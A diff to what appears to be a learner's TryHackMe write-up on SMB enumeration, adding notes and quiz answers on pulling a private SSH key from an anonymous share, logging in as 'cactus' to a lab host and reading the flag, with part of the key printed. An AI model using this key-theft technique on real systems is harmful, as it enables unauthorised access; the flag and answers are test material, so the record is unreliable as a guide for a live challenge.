@@ -386,6 +386,9 @@ smb: \> ls
   .gnupg                             DH        0  Tue Apr 21 07:08:23 2020
 
                 12316808 blocks of size 1024. 7584044 blocks available
+#####################################################################################
+After downloading every possible files I backgrounded the process using ctrl+z and read all the downloaded files
+#####################################################################################
 smb: \> ^Z
 zsh: suspended  smbclient //10.10.59.204/profiles -U Anonymous -p139,445
                                                                                                                    
@@ -455,12 +458,7 @@ gJXbXt1K/jbk8pQ1sgzjOjGhuUFAcAw5DnVLyvubXE/P2b4/z7U3gVjGI3jDYleL
 x0/mpwKBgQCsrvJXtzUQwKsskWpYdOKp5sB0BUNCK4nC4T8T4aqGQaa2X87fmGU1
 R8KXJ1nCfENH+hCza0ZDxUX7Pf2SWGLlminvZHxvl/BUZanpYaJJGCKSNM05tDsh
 71DetLqdn48jtdav/U5i+/lSIQ9fW17JNPtkDD26fAmWg40za1Z51g==                                                                                                                
-┌──(root㉿kali)-[/home/kali]
-└─# ls        
- clubweb.txt   Downloads    Music      profile     Templates
- Desktop       id_rsa       nessus     Public      Videos
- Documents     id_rsa.pub   Pictures   sudoadmin  'Working From Home Information.txt'
-                                                                                                                   
+                                                                                                             
 ┌──(root㉿kali)-[/home/kali]
 └─# cat id_rsa.pub 
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDb7OaL8zLZ5Z8OU3wZPSIQHaoyI8Yc3I/8/Y6faWgYTZbfNPexli0jxdAeTeGy2X3XACWcB4HFejbiNsMYLjy517gwWKPBvN865i8uIQ0Gqayq/KmBHpuBbR0yX/SpyfyvzR3VD16pg/D+WT8hLaNHSYm6FNYLsmVnWDSJDBhS179czftuoW55mw/OqzWVr5ln9cKeeuXlNV1lqCjBqF3ClzEBvN4JW8GS/riLTeHcXeMIMUTuIpr4XovN/VivIlLqTYy7lHuUh6L2RqAfw5+FSr4QZW1zHCMoS6FooTomq/03EGJCGcp80/fT0e04n+7+PxnmvZQkOwe1A1hUG6C/ cactus@polosmb
@@ -483,54 +481,34 @@ Regards,
 James
 Department Manager 
 
-                                                                                                                   
+d. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
+sol. John Cactus
+
+e. What service has been configured to allow him to work from home?
+sol. ssh
+
+f. Okay! Now we know this, what directory on the share should we look in?
+sol. .ssh
+
+g. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
+sol. id_rsa
+
+h. Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
+Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.
+What is the smb.txt flag?
+sol. THM{smb_is_fun_eh?}
+
 ┌──(root㉿kali)-[/home/kali]
 └─# ls -la                                                        
 total 208
 drwx------ 21 kali kali  4096 Sep 11 13:15  .
 drwxr-xr-x  3 root root  4096 Feb 25  2024  ..
--rw-r--r--  1 kali kali   220 Feb 25  2024  .bash_logout
--rw-r--r--  1 kali kali  3771 Sep 11 13:15  .bashrc
--rw-r--r--  1 kali kali  3526 Feb 25  2024  .bashrc.original
-drwx------  8 kali kali  4096 May 16 05:29  .BurpSuite
-drwxr-xr-x 16 kali kali  4096 Aug 11 15:19  .cache
--rw-r--r--  1 root root  3108 Aug 10 13:54  clubweb.txt
-drwxr-xr-x 18 kali kali  4096 Aug 11 15:08  .config
-drwx------  3 kali kali  4096 Apr 13 08:51  .dbus
-drwxr-xr-x  2 kali kali  4096 Aug 11 15:37  Desktop
--rw-r--r--  1 kali kali    35 Apr  3 11:36  .dmrc
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Documents
-drwxr-xr-x  3 kali kali  4096 Sep  3 10:16  Downloads
--rw-------  1 kali kali 12288 Aug 26 00:09  .exp.swp
--rw-r--r--  1 kali kali 11759 Feb 25  2024  .face
-lrwxrwxrwx  1 kali kali     5 Feb 25  2024  .face.icon -> .face
-drwx------  3 kali kali  4096 Apr  3 11:36  .gnupg
-drwx------  2 kali kali  4096 Apr 13 08:51  .gvfs
--rw-------  1 kali kali     0 Apr  3 11:36  .ICEauthority
 -rw-r--r--  1 root root  1679 Sep 11 13:15  id_rsa
 -rw-r--r--  1 root root   396 Sep 11 13:15  id_rsa.pub
-drwxr-xr-x  4 kali kali  4096 Apr 12 00:40  .java
--rw-------  1 kali kali    20 Aug  7 23:06  .lesshst
-drwxr-xr-x  4 kali kali  4096 Apr  3 11:36  .local
-drwx------  4 kali kali  4096 Apr  4 13:27  .mozilla
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Music
-drwxr-xr-x  2 kali kali  4096 Apr 11 22:40  nessus
-drwxr-xr-x  2 kali kali  4096 May  6 12:48  Pictures
-drwx------  3 kali kali  4096 Apr 12 03:00  .pki
--rw-r--r--  1 kali kali   807 Sep 10 12:38  .profile
 -rw-r--r--  1 root root   807 Sep 11 13:08  profile
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Public
 -rw-r--r--  1 root root     0 Sep 11 13:09  sudoadmin
--rw-r--r--  1 kali kali     0 Apr  3 12:29  .sudo_as_admin_successful
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Templates
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
--rw-------  1 kali kali 12860 Sep  2 12:20  .viminfo
 -rw-r--r--  1 root root   358 Sep 11 13:14 'Working From Home Information.txt'
--rw-------  1 kali kali    49 Sep 11 12:41  .Xauthority
--rw-------  1 kali kali  4255 Sep 11 12:47  .xsession-errors
--rw-------  1 kali kali  4182 Sep 11 09:47  .xsession-errors.old
--rw-------  1 kali kali  6281 Sep 10 13:33  .zsh_history
--rw-r--r--  1 kali kali 10868 Feb 25  2024  .zshrc
+
                                                                                                                    
 ┌──(root㉿kali)-[/home/kali]
 └─# chmod 600 id_rsa
@@ -540,49 +518,17 @@ drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
 total 208
 drwx------ 21 kali kali  4096 Sep 11 13:15  .
 drwxr-xr-x  3 root root  4096 Feb 25  2024  ..
--rw-r--r--  1 kali kali   220 Feb 25  2024  .bash_logout
--rw-r--r--  1 kali kali  3771 Sep 11 13:15  .bashrc
--rw-r--r--  1 kali kali  3526 Feb 25  2024  .bashrc.original
-drwx------  8 kali kali  4096 May 16 05:29  .BurpSuite
-drwxr-xr-x 16 kali kali  4096 Aug 11 15:19  .cache
--rw-r--r--  1 root root  3108 Aug 10 13:54  clubweb.txt
-drwxr-xr-x 18 kali kali  4096 Aug 11 15:08  .config
-drwx------  3 kali kali  4096 Apr 13 08:51  .dbus
-drwxr-xr-x  2 kali kali  4096 Aug 11 15:37  Desktop
--rw-r--r--  1 kali kali    35 Apr  3 11:36  .dmrc
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Documents
-drwxr-xr-x  3 kali kali  4096 Sep  3 10:16  Downloads
--rw-------  1 kali kali 12288 Aug 26 00:09  .exp.swp
--rw-r--r--  1 kali kali 11759 Feb 25  2024  .face
-lrwxrwxrwx  1 kali kali     5 Feb 25  2024  .face.icon -> .face
-drwx------  3 kali kali  4096 Apr  3 11:36  .gnupg
-drwx------  2 kali kali  4096 Apr 13 08:51  .gvfs
--rw-------  1 kali kali     0 Apr  3 11:36  .ICEauthority
 -rw-------  1 root root  1679 Sep 11 13:15  id_rsa
 -rw-r--r--  1 root root   396 Sep 11 13:15  id_rsa.pub
-drwxr-xr-x  4 kali kali  4096 Apr 12 00:40  .java
--rw-------  1 kali kali    20 Aug  7 23:06  .lesshst
-drwxr-xr-x  4 kali kali  4096 Apr  3 11:36  .local
-drwx------  4 kali kali  4096 Apr  4 13:27  .mozilla
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Music
-drwxr-xr-x  2 kali kali  4096 Apr 11 22:40  nessus
-drwxr-xr-x  2 kali kali  4096 May  6 12:48  Pictures
-drwx------  3 kali kali  4096 Apr 12 03:00  .pki
--rw-r--r--  1 kali kali   807 Sep 10 12:38  .profile
 -rw-r--r--  1 root root   807 Sep 11 13:08  profile
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Public
 -rw-r--r--  1 root root     0 Sep 11 13:09  sudoadmin
--rw-r--r--  1 kali kali     0 Apr  3 12:29  .sudo_as_admin_successful
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Templates
-drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
--rw-------  1 kali kali 12860 Sep  2 12:20  .viminfo
 -rw-r--r--  1 root root   358 Sep 11 13:14 'Working From Home Information.txt'
--rw-------  1 kali kali    49 Sep 11 12:41  .Xauthority
--rw-------  1 kali kali  4255 Sep 11 12:47  .xsession-errors
--rw-------  1 kali kali  4182 Sep 11 09:47  .xsession-errors.old
--rw-------  1 kali kali  6281 Sep 10 13:33  .zsh_history
--rw-r--r--  1 kali kali 10868 Feb 25  2024  .zshrc
-                                                                                                                   
+
+##############################################################################
+From the above information I tried to connect through ssh using the private rsa i have downloaded and using the johcactus as user name
+ssh -i path/to/private/rsa/key username@ip_address
+##############################################################################
+
 ┌──(root㉿kali)-[/home/kali]
 └─# ssh -i /home/kali/id_rsa johncactus@10.10.59.204
 
@@ -598,7 +544,12 @@ johncactus@10.10.59.204's password:
 Permission denied, please try again.
 johncactus@10.10.59.204's password: 
 johncactus@10.10.59.204: Permission denied (publickey,password).
-                                                                                                                   
+
+########################################################################
+But It didn't work then I thought I have used wrong username.
+then I went through the files all over again and while going through public rsa key I saw cactus@polosmb and then when I used it I connected successfuly and read the files available to find the flag.
+########################################################################
+
 ┌──(root㉿kali)-[/home/kali]
 └─# ssh -i /home/kali/id_rsa cactus@10.10.59.204 
 
@@ -625,3 +576,8 @@ cactus@polosmb:~$ ls
 smb.txt
 cactus@polosmb:~$ cat smb.txt
 THM{smb_is_fun_eh?}
+
+TASK 5: Understanding Telnet 
+Telnet
+- Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.
+- 
